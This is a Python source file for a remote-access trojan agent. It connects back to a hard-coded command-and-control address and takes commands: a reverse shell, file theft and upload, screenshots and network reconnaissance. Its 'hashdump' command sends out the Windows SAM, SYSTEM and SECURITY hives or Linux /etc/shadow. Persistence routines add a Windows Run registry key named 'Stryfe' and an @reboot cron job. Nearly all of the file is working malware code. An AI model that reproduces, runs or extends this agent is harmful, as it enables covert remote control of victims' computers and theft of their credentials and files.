import socket, ssl, threading, sys, os, subprocess
import secrets, platform, uuid, datetime
import shutil, hashlib, mss, mss.tools
from getpass import getuser
from time import sleep

if platform.system() == "Windows":
    import winreg

ERROR_INSUFFICIENT_PERMS = b'\x98\x90\x90\x30\x22\x11'
SIG_EOF = b'\x4F\x4F\x4E\x4F\x01'
FILE_NOT_FOUND = b'\x01\x23\x45\x67\x89'

class Client:
    def __init__(self, server_address, server_port):
        self.server_address = server_address
        self.server_port = server_port
        self.secure_sock = None
        self.platform = platform.system()
        self.hostname = platform.uname()[1]
        self.user = getuser()
        self.mac = uuid.getnode()
        self.uid = self.getClientUID()
        self.commands = {
            'shell': self.reverse_shell,
            'screenshot': self.screenshot,
            'download': self.download,
            'upload': self.upload,
            'hashdump': self.hashdump,
            'search': self.search,
            'ipconfig': self.ipconfig,
            'kill': self.kill
        }
        self.agent_path = None
        self.is_killed = False
    
    def connect(self):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.secure_sock = context.wrap_socket(sock, server_hostname=self.server_address)

        try:
            self.secure_sock.connect((self.server_address, self.server_port))

            information_json = self.getJSONHostInfos()
            self.secure_sock.sendall(information_json.encode())

            self.receive_commands()

        except ssl.SSLError as e:
            pass
        except Exception as e:
            pass
        finally:
            self.secure_sock.close()

    def receive_commands(self):
        
        receive_thread = threading.Thread(target=self._receive_commands)
        receive_thread.start()
        receive_thread.join()

    def _receive_commands(self):
        while True:
            try:
                command = self.secure_sock.recv(4096).decode()

                if command:
                    command_name, *args = command.split(' ')
                    command_name = command_name.lower()
                    if command_name in self.commands:
                        self.commands[command_name](' '.join(args))

                elif not command:
                    break
            except Exception as e:
                break

    def kill(self, args):
        self.secure_sock.close()
        self.is_killed = True

    def screenshot(self, args):
        raise NotImplementedError("This method should be implemented by subclasses")

    def reverse_shell(self, args):
        while True:
            command = self.secure_sock.recv(4096).decode()
            if command.strip().lower() == 'exit':
                break
            try:
                if command.lower().startswith('cd '):
                    directory = command[3:].strip()
                    os.chdir(directory)
                    output = f"Changed directory to {os.getcwd()}"
                else:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                    ####

            except subprocess.CalledProcessError as e:
                output = e.output
                self.secure_sock.send(output.encode())
                continue
            except Exception as e:
                output = str(e)
                self.secure_sock.send(output.encode())
                continue
            self.secure_sock.send(output.encode())

    def download(self, args):
        args = args.split(" ")
        for file_path in args:
            try:
                with open(file_path, 'rb') as f:
                    while (chunk := f.read(4096)):
                        self.secure_sock.sendall(chunk)
                self.secure_sock.sendall(SIG_EOF)
            except Exception as e:
                self.secure_sock.sendall(FILE_NOT_FOUND)

    def upload(self, args):
        try:
            with open(args, 'w+b') as f:
                while True:
                    data = self.secure_sock.recv(4096)
                    decoded_data = data.decode("latin1")
                    if (data == SIG_EOF) or (not data):
                        break
                    if (data == FILE_NOT_FOUND):
                        os.remove(f)
                        return
                    f.write(data)
        except Exception as e:
            return
    
    def getJSONHostInfos(self):        
        return f"{{\"hostname\": \"{self.hostname}\", \"user\": \"{self.user}\", \"mac\": \"{self.mac}\", \"uid\": \"{self.uid}\", \"timestamp\": \"{datetime.datetime.now()}\", \"os\": \"{platform.system()}\"}}"

    def getClientUID(self):
        """Create a UID combining the hostname the mac address and the user running the agent"""
        string = f"{self.hostname}{self.mac}{self.user}"
        hostUID = hashlib.sha256(string.encode()).hexdigest()
        return hostUID[:8]

    def hashdump(self, args):
        raise NotImplementedError("This method should be implemented by subclasses")

    def persistence(self):
        raise NotImplementedError("This method should be implemented by subclasses")

    def search(self, args):
        args = args.split(" ")
        filename = args[1]
        results = []
        for root, dir, files in os.walk(args[0]):
            if filename in files:
                results.append(os.path.join(root, filename))
        for file in results:
            self.secure_sock.sendall(file.encode())
        self.secure_sock.sendall(SIG_EOF)

    def ipconfig(self, args):
        raise NotImplementedError("This method should be implemented by subclasses")


class WindowsClient(Client):
    def __init__(self, server_address, server_port):
        super().__init__(server_address, server_port)
    
    def screenshot(self, args):
        appdata = os.getenv('APPDATA')
        screen_path = os.path.join(appdata, f"{secrets.token_hex(5)}.jpg")

        with mss.mss() as sct:
            screenshot = sct.grab(sct.monitors[0])
            mss.tools.to_png(screenshot.rgb, screenshot.size, output=screen_path)
        
        with open(screen_path, 'rb') as f:
            while (chunk := f.read(4096)):
                self.secure_sock.sendall(chunk)
        self.secure_sock.sendall(SIG_EOF)
        os.remove(screen_path)

    def persistence(self):
        self.agent_path = os.path.join(os.getenv('APPDATA'), f"{self.uid}.exe")

        # Check if Persistence is already in place
        if os.path.exists(self.agent_path):
            return 0

        try:
            shutil.copy2(sys.argv[0], self.agent_path)

        except Exception as e:
            return 1

        # Add the exe to startup programs
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Stryfe", 0, winreg.REG_SZ, self.agent_path)
        winreg.CloseKey(key)

    def send_file(self, path):
        # if it exists
        if os.access(path, os.F_OK):
            # if user has permissions to read the file
            if os.access(path, os.R_OK):
                try:
                    with open(path,'rb') as f:
                        while (chunk := f.read(4096)):
                            self.secure_sock.sendall(chunk)
                    self.secure_sock.sendall(SIG_EOF)
                except Exception as e:
                    print("Error while sending file: ", e)
                    self.secure_sock.sendall(f"ERROR:\n {str(e)}".encode())
            else:
                # Sending error code if user doesnt have permissions to dump hashes
                self.secure_sock.sendall(ERROR_INSUFFICIENT_PERMS)
            self.secure_sock.sendall(SIG_EOF)
        else:
            self.secure_sock.sendall(FILE_NOT_FOUND)

    def delete_file(self, filepath):
        try:
            os.remove(filepath)
        except Exception as e:
            pass

    def hashdump(self, args):
        print("In hashdump windows client")
        base_path = os.path.join('C:', 'Windows', 'Temp')
        sam_path = os.path.join(base_path, 'sam')
        system_path = os.path.join(base_path, 'system')
        security_path = os.path.join(base_path, 'security')

        # Delete files if they exist to avoid entering in interactive mode
        self.delete_file(sam_path)
        subprocess.run("reg save HKLM\\SAM %s" % sam_path, shell=True)
        self.delete_file(system_path)
        subprocess.run("reg save HKLM\\SYSTEM %s" % system_path, shell=True)
        self.delete_file(security_path)
        subprocess.run("reg save HKLM\\SECURITY %s" % security_path, shell=True)

        print(f"Sending file {sam_path}")
        self.send_file(sam_path)
        print(f"Sending file {system_path}")
        self.send_file(system_path)
        print(f"Sending file {security_path}")
        self.send_file(security_path)

    def ipconfig(self, args):
        output = subprocess.check_output("ipconfig /all", shell=True, text=True, encoding='utf-8', errors='ignore')
        self.secure_sock.sendall(output.encode())


class LinuxClient(Client):
    def __init__(self, server_address, server_port):
        super().__init__(server_address, server_port)

    def screenshot(self, args):
        screen_path = f"/tmp/{secrets.token_hex(5)}.jpg"

        with mss.mss() as sct:
            screenshot = sct.grab(sct.monitors[0])
            mss.tools.to_png(screenshot.rgb, screenshot.size, output=screen_path)
        
        with open(screen_path, 'rb') as f:
            while (chunk := f.read(4096)):
                self.secure_sock.sendall(chunk)
        self.secure_sock.sendall(SIG_EOF)
        os.remove(screen_path)

    def persistence(self):

        self.agent_path = os.path.join(os.getenv('HOME'), f".{self.uid}")

        try:
            shutil.copy2(sys.argv[0], self.agent_path)

        except Exception as e:
            return 1

        # Read whole current crontab
        try:
            crontab = subprocess.run(['crontab', '-l'], capture_output=True, text=True).stdout
        except:
            return 0
        # Malicious cron for persistence
        job = f"@reboot bash -c {self.agent_path}\n"
        
        # Check if cron already exist
        if job not in crontab:
            crontab = crontab + job
            process = subprocess.run(['crontab', '-'], input=crontab, text=True)

        # TODO Self removing the executable

    def hashdump(self, args):
        if os.access('/etc/shadow', os.R_OK):
            try:
                with open('/etc/shadow','rb') as f:
                    while (chunk := f.read(4096)):
                        self.secure_sock.sendall(chunk)
                self.secure_sock.sendall(SIG_EOF)
            except Exception as e:
                self.secure_sock.sendall(f"ERROR:\n {str(e)}".encode())
        else:
            # Sending error code if user doesnt have permissions to dump hashes
            self.secure_sock.sendall(ERROR_INSUFFICIENT_PERMS)

    def ipconfig(self, args):
        try:
            output = subprocess.check_output("ip a", shell=True, text=True, encoding='utf-8', stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            output = e.output
        finally:
            self.secure_sock.sendall(output.encode())

if __name__ == "__main__":
    C2_IP = '192.168.1.62'
    C2_PORT = 8888
    if platform.system() == 'Windows':
        client = WindowsClient(C2_IP, C2_PORT)
        #client.persistence()
    else:
        client = LinuxClient(C2_IP, C2_PORT)
        #client.persistence()
    while not client.is_killed:
        try:
            client.connect()
        except:
            sleep(3)
            continue
